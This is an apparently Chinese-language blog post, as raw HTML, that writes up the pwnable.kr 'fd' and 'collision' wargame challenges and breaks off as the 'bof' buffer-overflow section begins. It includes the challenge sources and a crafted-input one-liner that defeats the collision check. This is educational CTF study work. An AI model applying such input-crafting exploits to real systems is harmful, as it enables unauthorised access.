@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Sp4n9x" />
+<meta name="renderer" content="webkit">
+<meta name="google" value="notranslate">
+
+
+
+<meta name="description" content="开始入坑Pwn,此篇博文记录在pwnable.kr网站上做题的过程和在做题过程中遇到的新的知识点的学习！">
+<meta name="keywords" content="CTF,Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr">
+<meta property="og:url" content="http://sp4n9x.github.io/2018/03/23/pwnable.kr/index.html">
+<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
+<meta property="og:description" content="开始入坑Pwn,此篇博文记录在pwnable.kr网站上做题的过程和在做题过程中遇到的新的知识点的学习！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-00.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-01.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-02.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-03.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-04.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-05.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-18-00.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-18-01.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-18-02.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-18-03.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-26-00.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-26-01.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-26-02.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-26-03.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-27-00.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-27-01.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-27-02.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-27-03.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-27-04.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-28-00.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-28-01.png">
+<meta property="og:image" content="http://sp4n9x.github.io/resources/2018/2018-04-28-02.png">
+<meta property="og:updated_time" content="2018-04-28T06:03:45.980Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr">
+<meta name="twitter:description" content="开始入坑Pwn,此篇博文记录在pwnable.kr网站上做题的过程和在做题过程中遇到的新的知识点的学习！">
+<meta name="twitter:image" content="http://sp4n9x.github.io/resources/2018/2018-03-23-00.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>pwnable.kr | Sp4n9x&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">留言板</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
+                            
+                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
+                            
+                            <!--
+                            <div id="music163player">
+                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
+                                </iframe>
+                            </div>
+                            -->
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">留言板</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
+                            
+                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-pwnable.kr" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/03/23/pwnable.kr/" class="article-date">
+      <time datetime="2018-03-22T16:00:00.000Z" itemprop="datePublished">2018-03-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwnable.kr
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+          
+        <blockquote>
+<p>开始入坑Pwn,此篇博文记录在pwnable.kr网站上做题的过程和在做题过程中遇到的新的知识点的学习！<br><a id="more"></a></p>
+</blockquote>
+<h2 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="[Toddler’s Bottle]"></a>[Toddler’s Bottle]</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><blockquote>
+<p><strong>题目描述:</strong><br>Mommy! what is a file descriptor in Linux?<br>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial<br>link: <a href="https://www.youtube.com/watch?v=blAxTfcW9VU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=blAxTfcW9VU</a><br>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h4 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>通过题目名称和题目描述可知,此题与Linux下文件的描述有关系。题目还给了一个ssh连接账号和密码,先连接一下看看。</p>
+<div align="left"><br>    <img src="/resources/2018/2018-03-23-00.png" alt="登录成功"><br></div>
+
+<blockquote>
+<p><strong>知识点一</strong> Linux系统文件描述fd(file descriptor)</p>
+</blockquote>
+<h4 id="0x01-查看文件及权限"><a href="#0x01-查看文件及权限" class="headerlink" title="0x01 查看文件及权限"></a>0x01 查看文件及权限</h4><p>再看看当前目录下有什么文件,发现了三个文件,fd、fd.c、flag,并且看到当前用户对于flag文件没有读权限。</p>
+<div align="left"><br>    <img src="/resources/2018/2018-03-23-01.png" alt="查看文件"><br></div>
+
+<blockquote>
+<p><strong>知识点二</strong> Linux文件权限</p>
+</blockquote>
+<h4 id="0x02-分析fd-c"><a href="#0x02-分析fd-c" class="headerlink" title="0x02 分析fd.c"></a>0x02 分析fd.c</h4><p>查看fd.c内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先分析一下这段代码,main()函数有三个参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">****************************main()原型*******************************</span><br><span class="line"><span class="number">1.</span> argc  指命令行输入参数的个数(编译器根据用户输入计算,程序名称也算在里面)</span><br><span class="line"><span class="number">2.</span> argv  存储命令行输入的参数(多个参数用空格分隔,以<span class="literal">NULL</span>结束)</span><br><span class="line"><span class="number">3.</span> env   存储了系统的环境变量</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* env[] )</span></span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>1.要想拿到flag,执行system(“/bin/cat flag”)<br>2.就要使if(!strcmp(“LETMEWIN\n”, buf))的条件为真<br>3.那么就要使strcmp(“LETMEWIN\n”,buf)返回0,也就是buf=”LETMEWIN\n”<br>4.buf中的值是从fd中读出来的<br>5.atoi(表示 ascii to integer)是把字符串转换成整型数的一个函数<br>6.当argv[1]=”4660”时,fd=0.表示从键盘读入数据存放到buf中,因为在Linux系统将所有设备都当作文件来处理,当fd=0时就是把键盘当做一个文件</p>
+</blockquote>
+<div align="center"><strong>Linux标准文件描述符</strong></div>
+
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件描述符</th>
+<th style="text-align:center">缩写</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">0</td>
+<td style="text-align:center">STDIN</td>
+<td style="text-align:center">标准输入</td>
+</tr>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">STDOUT</td>
+<td style="text-align:center">标准输出</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td style="text-align:center">STDERR</td>
+<td style="text-align:center">标准错误输出</td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">****************************read()原型*******************************</span><br><span class="line">read from a file descriptor</span><br><span class="line"><span class="number">1.</span> fd    文件描述符，用来指向要操作的文件的文件结构体</span><br><span class="line"><span class="number">2.</span> buf   读上来的数据保存在缓冲区buf中</span><br><span class="line"><span class="number">3.</span> count 请求读取的字节数</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br><span class="line">函数的返回值说明：</span><br><span class="line">(<span class="number">1</span>)如果成功，返回读取的字节数(字符串结束符 <span class="string">'\0'</span>不算);</span><br><span class="line">(<span class="number">2</span>)如果出错，返回<span class="number">-1</span>并设置errno;</span><br><span class="line">(<span class="number">3</span>)如果在调read函数之前已是文件末尾，则返回<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h4 id="0x03-拿取flag"><a href="#0x03-拿取flag" class="headerlink" title="0x03 拿取flag"></a>0x03 拿取flag</h4><div align="left"><br>    <img src="/resources/2018/2018-03-23-02.png" alt="flag"><br></div>
+
+
+<h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><blockquote>
+<p><strong>题目描述:</strong><br>Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!<br>ssh col@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h4 id="0x00-题目分析-1"><a href="#0x00-题目分析-1" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>由题目可知,这道题是一个与MD5哈希碰撞有关的题目。和上一道题一样,给出了SSH登录账号和密码,依旧登录一下。登陆成功,当前用户是col</p>
+<div align="left"><br>    <img src="/resources/2018/2018-03-23-03.png" alt="登陆成功"><br></div>
+
+<h4 id="0x01-查看文件权限"><a href="#0x01-查看文件权限" class="headerlink" title="0x01 查看文件权限"></a>0x01 查看文件权限</h4><p>依旧和第一题相似，本题用户对flag文件依旧没有读取权限，当前用户目录一共有三个文件，col、col.c、flag</p>
+<div align="left"><br>    <img src="/resources/2018/2018-03-23-04.png" alt="查看文件权限"><br></div>
+
+<h4 id="0x02-分析col-c"><a href="#0x02-分析col-c" class="headerlink" title="0x02 分析col.c"></a>0x02 分析col.c</h4><p>查看col.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码开始的时候定义了一个hashcode,有一个check_password()函数,可知要求输入一个password进行比对, 再看看主函数和上题很像，有argc和argv[]两个参数，由此可知password将在执行这段代码的时候跟在程序名称后面传入程序中。</p>
+<p>当没有传入参数时，显示此段程序的usage<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>由下面这段程序可知,输入的参数的长度为20字节时,才会执行if语句里的system(“/bin/cat flag”),输出flag<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>再来看看check_password()函数,传入的参数是一个char型的字符数组,在函数里面通过int<em> ip = (int</em>)p将char型的字符数组转换成int型的字符数组,20个字节的字符数组就变成拥有5个元素的int型数组,通过for循环进行累加,得到的值与hashcode进行比对。<br>对20个字节，要构造输入的整型转换后的5个整数求和 == 0x21DD09EC，<br>第一个想法是：前16个字节赋\x00，最后4个字节为0xEC09DD21，但是\x09是HTab，输入会被阻断。<br>第二个想法：前16个字节赋\x01，最后4个字节为\xE8\x05\xD9\x1D，嗯，就这样。<br>0x01010101*4+0x1DD905E8=0x21DD09EC</p>
+</blockquote>
+<h4 id="0x03-拿取flag-1"><a href="#0x03-拿取flag-1" class="headerlink" title="0x03 拿取flag"></a>0x03 拿取flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &quot;print &apos;\x01&apos; * 16 + &apos;\xE8\x05\xD9\x1D&apos;&quot;`</span><br></pre></td></tr></table></figure>
+<p>解释一下这段命令,在bash中,$( )与` `（反引号）都是用来作命令替换的。命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。-c 参数，直接运行python语句,用print语句打印出构造好的20个字节。然后将输出的20个字节数据传进col,进行验证，得到flag</p>
+<div align="left"><br>    <img src="/resources/2018/2018-03-23-05.png" alt="flag"><br></div>
+
+
+<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote>
+<p><strong>题目描述</strong><br>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?<br>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="noopener">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="noopener">http://pwnable.kr/bin/bof.c</a><br>Running at : nc pwnable.kr 9000</p>
+</blockquote>
+<h4 id="0x00-题目分析-2"><a href="#0x00-题目分析-2" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>有题目可知这是一道和<code>缓冲区溢出</code>有关的题目。题目给了两个文件，先来看看两个文件的信息吧。</p>
+<h4 id="0x01-bof-amp-bof-c"><a href="#0x01-bof-amp-bof-c" class="headerlink" title="0x01 bof&amp;bof.c"></a>0x01 bof&amp;bof.c</h4><p>先用file命令查看一下<code>bof</code>的文件信息</p>
+<div align="left"><br>    <img src="/resources/2018/2018-04-18-00.png" alt="bof"><br></div>
+
+<p>由得出的信息可以知道Linux下一个32bit的ELF文件。再查看一下<code>bof.c</code></p>
